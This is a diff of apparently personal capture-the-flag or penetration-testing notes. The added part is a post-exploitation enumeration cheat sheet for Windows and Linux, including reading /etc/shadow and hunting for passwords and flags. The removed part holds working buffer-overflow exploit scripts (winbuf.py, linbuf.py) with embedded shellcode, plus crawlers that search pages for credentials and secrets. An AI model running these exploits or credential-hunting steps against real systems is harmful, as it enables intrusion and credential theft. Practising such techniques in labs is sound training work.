@@ -1,3 +1,5 @@
+echo '' | grep -E '([" ])[a-zA-Z0-9]{20}\1'
+
                                   RECON
 ================================================================================
   1)  SSH to jump box
@@ -177,256 +179,92 @@
     exploit 
                         LIVING OFF THE LAND
 ================================================================================
-1)  Static
-  
 
 
 
+                        POST X
+================================================================================
+METHOD:
+  1)  USR - check for account that have shells, home folders, special permissions
+  2)  PROC  -  check services that may be connceted to folders that have flags or potial ssh tunnels
+  3)  SERV  -  look for poteial execuatbles where you could launch a buffer overflow attack or dll hijacking
+  4)  NET  -  look potial targets and ports transmiting information
+  5)  ADD  -  look for more information related to target or victim
+
+keywords   -  secret,  flag,  hint,  password,  pass,  victim,  bad,  evil,  exploit, network,  map,  server,  message,  note,  key,  script.
 
 
+WIN USR
+net user                           - Displays a list of local users by username
+net user <username>                - Displays properties associated with that username
+net localgroup                     - Displays a list of local groups on the system
+net localgroup <groupName>         - Provides a description of what the local group can do with a list of members in that group
+wmic useraccount get name,sid      - This command displays the Security IDs (SIDs) of all user accounts on the system. If you know the username, use this command: wmic useraccount where name="USER" get sid
 
+LIN USER
+cat /etc/passwd **OR** getent passwd - List of all users/accounts on the local system by name, user-id, comment, home directory, and shell.
+cat /etc/shadow                    - List of all users/accounts on the system along with their hashed passwd, password age, and  expiration information.
+last                                 - History of previous account login/logout by username, terminal (local, remote), system/IP, date/time of login/logout, and duration.
+who                                  - Who is currently logged into the system by name, terminal (local/remote), date/time they logged in, and IP address if remote.
+w                                  - Who is currently logged into the system by username, terminal, and what they are doing.
+whoami                             - Displays the user name of the user running the command
+groups                             - Displays the list of groups to which the user running the command is a member
+id                                 - Displays the username, userid, group name(s), and groupid(s) of the user running the command
 
+WIN PROC
+tasklist /v                                                                                                          - Displays "verbose" list of all running applications and services with their Process ID (PID).
+wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list          - This will return a list of all installed AV products from the local machine:
+wmic process where (processid=#) get parentprocessid,commandline                                                   - Display processes parent PID and command line
 
+LIN PROC
+ps -elf                              - View every process on the system in long format using standard UNIX syntax.
+ps auxf                              - View every process on the system in forest view using BSD syntax.
+pstree                             - Display a tree of processes. Forest view with the "ps" command tries to mimic this output to a certain degree.
+lsof                                 - List open files. Everything in UNIX/Linux is a file (to a certain degree). The lsof enumerates open files and can provide information on pretty much all the activity on a system to include networking.  Some of the common arguments with this command are files associated with a process-ID  "-p PID", and internet "-i".
 
+WIN SERV
+tasklist /svc                                              - Displays services hosted in each process.
+net start                                                  - Displays a list of services that have been started by their display name
+wmic service list status                                     - Displays name and status of services.
+Get-Service \ | Where {$_.Status -eq "Running"}              - PowerShell method of determining running services. Displays Name and DisplayName.
 
+LIN SERV
+chkconfig                                                  - SystemV method of listing all installed services
+systemctl list-units --type service                        - Systemd method of listing all installed services
+service --status-all                                       - SystemV method of listing running services.
+systemctl list-units --type=service | grep running        - Systemd method of listing running services
 
-scripts
-webscraper
-#!/usr/bin/python3
-import lxml.html
-import requests
-import json
+WIN NET
+ipconfig /all               - Display local interface information to include IP address/mask, MAC address, default router/gateway, and DNS settings.
+netstat /anob               - Displays local listening ports, process-id and binary.
+wmic netuse list full       - Displays: AccessMask, Comment, ConnectionState, ConnectionType, Description, DisplayType, InstallDate, LocalName, Name, Persistent, ProviderName, RemoteName, RemotePath, ResourceType, Status, UserName
+net use                     - NET USE connects a computer to a shared resource or disconnects a computer from a shared resource. When used without options, it lists the computer's connections.
+net view                    - Displays a list of resources being shared on the system. When used without options, it displays a list of computers in the current domain or network.
+arp -a                      - Displays the arp cache on the system.
+route print                 - Displays the system's routing table.
 
-def main():
-    # 1. CHANGE: Replace with the actual URL where your HTML table is hosted
-    url = 'http://localhost:21053/contact.html#' 
-    
-    try:
-        page = requests.get(url)
-        page.raise_for_status() # Ensures the request was successful
-    except requests.exceptions.RequestException as e:
-        print(f"Error fetching the page: {e}")
-        return
+LIN NET
+ip address **OR** ifconfig -a                 - Displays all interfaces on the system and their current configuration and status.
+ss **OR** netstat                             - Displays network connections/sockets.
 
-    tree = lxml.html.fromstring(page.content)
-    
-    # 2. CHANGE: Target the table rows (skipping the header row)
-    # This selects every <tr> that comes after the first <tr> (headers)
-    rows = tree.xpath('//table/tr[position() > 1]')
-    
-    output = []
-    
-    # Loop through each row to extract specific column data
-    for row in rows:
-        # td[1] = Corp Name, td[2] = Corp ID, td[3] = Content, td[4] = Last Update
-        corp_name = row.xpath('./td[1]/text()')
-        corp_id = row.xpath('./td[2]/text()')
-        content = row.xpath('./td[3]/text()')
-        last_update = row.xpath('./td[4]/text()')
-        
-        # Clean up the text (strip whitespaces/newlines) if data exists
-        resp = {
-            'corp': corp_name[0].strip() if corp_name else None,
-            #'corp_id': corp_id[0].strip() if corp_id else None,
-            #'content': content[0].strip() if content else None,
-            #'last_update': last_update[0].strip() if last_update else None
-        }
-        output.append(resp)
-        
-    # Print the beautifully structured JSON output
-    print(json.dumps(output, indent=4))
+Options:
+-a - displays all listening and non-listening ports
+-l - displays only listening ports
+-n - displays numeric IP addresses and ports
+-p - displays process-id and program name (for root only)
+-u - displays UDP sockets
+-t - displays TCP sockets
 
-if __name__ == "__main__":
-    main()
+arp -an                                     - Displays the arp cache on the system with numeric IPs instead of hostname.
+ip route **OR** route **OR** netstat -r         - Displays the system's routing table.
 
-winbuf.py
-#!/usr/bin/python
-import socket
-buf = "TRUN /.:/"
-buf += "A" * 2003
-#EIP = "BBBB"
+WIN ADD
+systeminfo              - lists info about the system you are on such as OS, OS version, product ID, processor(s), BIOS version, input locale, time zone, domain, hotfix(s), network card(s)
+date /t && time /t      - displays the current system date and time
 
-buf += "\xA0\x12\x50\x62"
-buf += "\x90" *15
-buf += b"\xba\x88\xc9\x87\x03\xda\xde\xd9\x74\x24\xf4\x5d"
-buf += b"\x33\xc9\xb1\x59\x31\x55\x14\x03\x55\x14\x83\xc5"
-buf += b"\x04\x6a\x3c\x7b\xeb\xe5\xbf\x84\xec\x99\x36\x61"
-buf += b"\xdd\x8b\x2d\xe1\x4c\x1b\x25\xa7\x7c\xd0\x6b\x5c"
-buf += b"\x72\x51\xc1\x7a\xbd\x62\x5d\xf0\x95\xad\xa2\x59"
-buf += b"\xd9\xac\x5e\xa0\x0e\x0e\x5e\x6b\x43\x4f\xa7\x3d"
-buf += b"\x29\xa0\x75\x35\x83\x2e\xf1\x0b\x18\x4f\xd5\xdb"
-buf += b"\xeb\x0f\xad\x66\x2b\xfb\x01\x68\x7c\x53\x11\x22"
-buf += b"\x64\xd8\x7d\x93\x95\x0d\xf8\x1a\xe1\x8d\x4a\xac"
-buf += b"\xf5\x66\x78\x45\x08\xae\xb0\x99\xa7\x8f\x7c\x14"
-buf += b"\xb9\xc8\xbb\xc7\xcc\x22\xb8\x7a\xd7\xf1\xc2\xa0"
-buf += b"\x52\xe5\x65\x22\xc4\xc1\x94\xe7\x93\x82\x9b\x4c"
-buf += b"\xd7\xcc\xbf\x53\x34\x67\xbb\xd8\xbb\xa7\x4d\x9a"
-buf += b"\x9f\x63\x15\x78\x81\x32\xf3\x2f\xbe\x24\x5b\x8f"
-buf += b"\x1a\x2f\x4e\xc6\x1b\xd0\x90\xe7\x41\x46\x5c\x2a"
-buf += b"\x7a\x96\xca\x3d\x09\xa4\x55\x96\x85\x84\x1e\x30"
-buf += b"\x51\x9d\x09\xc3\x8d\x25\x59\x3d\x2e\x55\x73\xfa"
-buf += b"\x7a\x05\xeb\x2b\x03\xce\xeb\xd4\xd6\x7a\xe6\x42"
-buf += b"\xd3\x48\x48\x2a\x8b\xae\xb4\x5a\x10\x27\x52\x0c"
-buf += b"\xf8\x67\xcb\xed\xa8\xc7\xbb\x85\xa2\xc8\xe4\xb6"
-buf += b"\xcc\x03\x8d\x5d\x23\xfd\xe5\xc9\xda\xa4\x7e\x6b"
-buf += b"\x22\x73\xfb\xab\xa8\x71\xfb\x62\x59\xf0\xef\x93"
-buf += b"\x3e\xfa\xef\x63\xab\xfa\x85\x67\x7d\xad\x31\x6a"
-buf += b"\x58\x99\x9d\x95\x8f\x9a\xda\x6a\x4e\xaa\x91\x5d"
-buf += b"\xc4\x92\xcd\xa1\x08\x12\x0e\xf4\x42\x12\x66\xa0"
-buf += b"\x36\x41\x93\xaf\xe2\xf6\x08\x3a\x0d\xae\xfd\xed"
-buf += b"\x65\x4c\xdb\xda\x29\xaf\x0e\x59\x2d\x4f\xcc\x76"
-buf += b"\x96\x27\x2e\xc7\x26\xb7\x44\xc7\x76\xdf\x93\xe8"
-buf += b"\x79\x2f\x5b\x23\xd2\x27\xd6\xa2\x90\xd6\xe7\xee"
-buf += b"\x75\x46\xe7\x1d\xae\x79\x92\x6e\x51\x7a\x63\x67"
-buf += b"\x36\x7b\x63\x87\x48\x40\xb5\xbe\x3e\x87\x05\x85"
-buf += b"\x31\xb2\x28\xac\xdb\xbc\x7f\xae\xc9"
+LIN ADD
+cat /proc/cpuinfo       - displays information about the CPU such as model name, vendor id, CPU MHz
+cat /etc/*rel*         - displays OS information like the name, version, home URL, and support URL
+cat /etc/hosts          - displays any locally configured hostnames
+lsmod
 
-s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("127.0.0.1", 1112))
-print s.recv(1024)
-s.send(buf)
-print s.recv(1024)
-
-s.close()
-
-linbuf.py
-
-#!/usr/bin/env python
-offset = 'A' *55
-#offset += 'BBBB'
-offset += '\x59\x3b\xde\xf7'
-offset += "\x90" * 15
-buf =  b""
-buf += b"\xbf\x46\xbc\x43\xbf\xda\xd3\xd9\x74\x24\xf4\x5e"
-buf += b"\x31\xc9\xb1\x0b\x31\x7e\x14\x83\xee\xfc\x03\x7e"
-buf += b"\x10\xa4\x49\x29\xb4\x70\x2b\xfc\xac\xe8\x66\x62"
-buf += b"\xb8\x0f\x10\x4b\xc9\xa7\xe1\xfb\x02\x55\x8b\x95"
-buf += b"\xd5\x7a\x19\x82\xe1\x7c\x9e\x52\x99\x14\xf1\x33"
-buf += b"\x08\x8d\x0d\xe3\x81\xc4\xef\xc6\xa6"
-
-
-
-#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
-print(offset + buf)
-
-webcrawler.py
-#!/usr/bin/python3
-import requests
-import lxml.html
-from urllib.parse import urljoin, urlparse
-
-def crawl(start_url):
-    visited_pages = set()
-    pages_to_visit = [start_url]
-    
-    target_domain = urlparse(start_url).netloc
-    print(f"[*] Starting crawler on domain: {target_domain}\n")
-
-    while pages_to_visit:
-        current_url = pages_to_visit.pop(0)
-
-        if current_url in visited_pages:
-            continue
-
-        print(f"[+] Crawling: {current_url}")
-        
-        try:
-            response = requests.get(current_url, timeout=5)
-            visited_pages.add(current_url)
-
-            if "text/html" not in response.headers.get("Content-Type", ""):
-                continue
-
-            # Parse using lxml instead of BeautifulSoup
-            tree = lxml.html.fromstring(response.content)
-            
-            # --- CHECK FOR FLAGS HERE ---
-            if "WoFssgA1KWSDRtoWziO4" in response.text:
-                 print("[!!!] Found target text on this page!")
-            # ----------------------------
-
-            # Find all links using XPath
-            links = tree.xpath('//a/@href')
-            for href in links:
-                absolute_url = urljoin(current_url, href)
-                absolute_url = urlparse(absolute_url)._replace(fragment="").geturl()
-
-                if urlparse(absolute_url).netloc == target_domain:
-                    if absolute_url not in visited_pages and absolute_url not in pages_to_visit:
-                        pages_to_visit.append(absolute_url)
-
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Error crawling {current_url}: {e}")
-
-    print("\n[*] Crawl complete!")
-    print(f"[*] Total unique pages discovered: {len(visited_pages)}")
-
-if __name__ == "__main__":
-    START_URL = "http://localhost:1211"
-    crawl(START_URL)
-new and improves webcrawler
-import re
-import requests
-from urllib.parse import urljoin
-
-# Base configuration
-TARGET_URL = "https://example.com"  # Replace with your target URL
-VISITED_URLS = set()
-
-# Define the regex patterns
-PASS_PATTERN = re.compile(r'\b(password|pass)\b', re.IGNORECASE)
-USER_PATTERN = re.compile(r'\b(username|user)\b', re.IGNORECASE)
-# Matches exactly 20 alphanumeric characters surrounded by spaces, quotes, or ><
-SECRET_20_PATTERN = re.compile(r'(?:[\s\'"]|><)([a-zA-Z0-9]{20})(?:[\s\'"]|><)')
-
-def check_content(html_content, url):
-    """Scans the HTML content for the specified target strings."""
-    found_something = False
-    print(f"\nScanning: {url}")
-    
-    # 1. Check for password variants
-    pass_matches = PASS_PATTERN.findall(html_content)
-    if pass_matches:
-        print(f"  [!] Found password keyword(s): {set(pass_matches)}")
-        found_something = True
-        
-    # 2. Check for username variants
-    user_matches = USER_PATTERN.findall(html_content)
-    if user_matches:
-        print(f"  [!] Found username keyword(s): {set(user_matches)}")
-        found_something = True
-        
-    # 3. Check for the 20-character random string
-    secret_matches = SECRET_20_PATTERN.findall(html_content)
-    if secret_matches:
-        print(f"  [!] Found 20-character string(s): {set(secret_matches)}")
-        found_something = True
-
-    if not found_something:
-        print("  [-] No matches found.")
-
-def crawl(url):
-    """Simple crawler function to fetch page and trigger the check."""
-    if url in VISITED_URLS:
-        return
-    
-    try:
-        VISITED_URLS.add(url)
-        response = requests.get(url, timeout=5)
-        
-        # Ensure it's text/html before parsing
-        if "text/html" in response.headers.get("Content-Type", ""):
-            check_content(response.text, url)
-            
-            # Optional: Add your link extraction logic here to keep crawling
-            # e.g., finding all hrefs and calling crawl(urljoin(url, link))
-            
-    except requests.exceptions.RequestException as e:
-        print(f"Failed to connect to {url}: {e}")
-
-if __name__ == "__main__":
-    crawl(TARGET_URL)
-
-
-
-      
